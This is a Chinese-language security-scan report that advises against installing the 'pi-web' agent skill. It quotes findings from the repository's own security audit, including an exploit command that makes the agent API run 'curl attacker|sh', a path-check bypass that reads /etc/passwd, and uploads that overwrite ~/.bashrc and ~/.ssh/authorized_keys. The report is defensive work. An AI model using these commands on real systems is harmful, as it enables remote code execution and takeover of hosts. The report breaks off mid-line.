> **[DANGER] 建議：不要安裝**
>
> **目標**: `github.com/ct-jyjntc/pi-web`
> **危險**: 發現 1 個嚴重問題。強烈建議不要安裝此 Skill
>
> ---

# Skill Safety-guard 風險報告

> **掃描目標**: `C:\Users\ADMINI~1\AppData\Local\Temp\safety-scan-pi-web-5zy91e6r`  
> **掃描文件數**: 2112  
> **發現問題數**: 3（🔴 1 | 🟠 2 | 🟡 0 | 🟢 0）

## 綜合風險等級：F

**🔴🔴 極高風險，建議不要使用**

---

## 第一層：Pi Agent 全局檢查

### Pi 版本
- **檢測到版本**: `0.84.2`
- ⚠️ 發現 1 個已知漏洞：
  - **CVE-2026-54327** (CRITICAL): 任意文件讀取漏洞：特定 SKILL.md frontmatter 可觸發讀取系統任意文件
    - 💡 升級 Pi 至 0.85.0 或更高版本

### auth.json 權限
- ✅ Windows ACL 符合安全要求（僅 Administrator 有讀寫權限）

---

## 第二層：Skill 內容檢測

### 🔑 憑證洩露
- 掃描文件: 528 個
- 發現問題: 0 個
- ✅ 未發現問題

### 💀 危險 Shell 命令
- 掃描文件: 528 個
- 發現問題: 1 個

### 🔴 curl piped to bash
- **規則 ID**: `shell-curl-bash`
- **嚴重度**: 🔴 CRITICAL | **置信度**: 🔴 high
- **位置**: `C:\Users\ADMINI~1\AppData\Local\Temp\safety-scan-pi-web-5zy91e6r\SECURITY_AUDIT.md:32`
- **命中**: `curl -X POST http://host:30141/api/agent/<id> -d '{"type":"bash","command":"curl...`
- **說明**: 遠程下載並執行腳本（極高風險，常見投毒載體）
- **建議**: 不要執行此類命令。如必須下載，先 curl -O 到本地審查後手動執行

```text
**Exploit:** `curl -X POST http://host:30141/api/agent/<id> -d '{"type":"bash","command":"curl attacker|sh"}'`
```

### 📁 敏感路徑訪問
- 掃描文件: 528 個
- 發現問題: 2 個

### 🟠 /etc/passwd access
- **規則 ID**: `path-etc-passwd`
- **嚴重度**: 🟠 HIGH | **置信度**: 🔴 high
- **位置**: `C:\Users\ADMINI~1\AppData\Local\Temp\safety-scan-pi-web-5zy91e6r\SECURITY_AUDIT.md:52`
- **命中**: `read&sessionId=<S>` → reads `/etc/passwd`
- **說明**: 訪問系統用戶/密碼文件
- **建議**: 正常 Skill 不應讀取這些文件

```text
`isFilePathReferencedBySession` returns true when the requested absolute path appears as a *substring* in *any* entry of a session the caller names. Caller controls session content: `POST /api/agent/n
```

### 🟠 .env file access
- **規則 ID**: `path-env-file`
- **嚴重度**: 🟠 HIGH | **置信度**: 🟡 medium
- **位置**: `C:\Users\ADMINI~1\AppData\Local\Temp\safety-scan-pi-web-5zy91e6r\SECURITY_AUDIT.md:67`
- **命中**: `load to `~/.bashrc`/`~/.zshrc`/`~/.env`
- **說明**: 訪問 .env 環境配置文件
- **建議**: 確保 .env 不在倉庫中；檢查該 Skill 是否真的需要此文件

```text
After C4 (home/`/` added), upload to `~/.bashrc`/`~/.zshrc`/`~/.env`/`~/.ssh/authorized_keys`/`~/.pi/agent/models.json`. `validateUploadFileNames` blocks some names but not these. `flag:"wx"` prevents
```

### �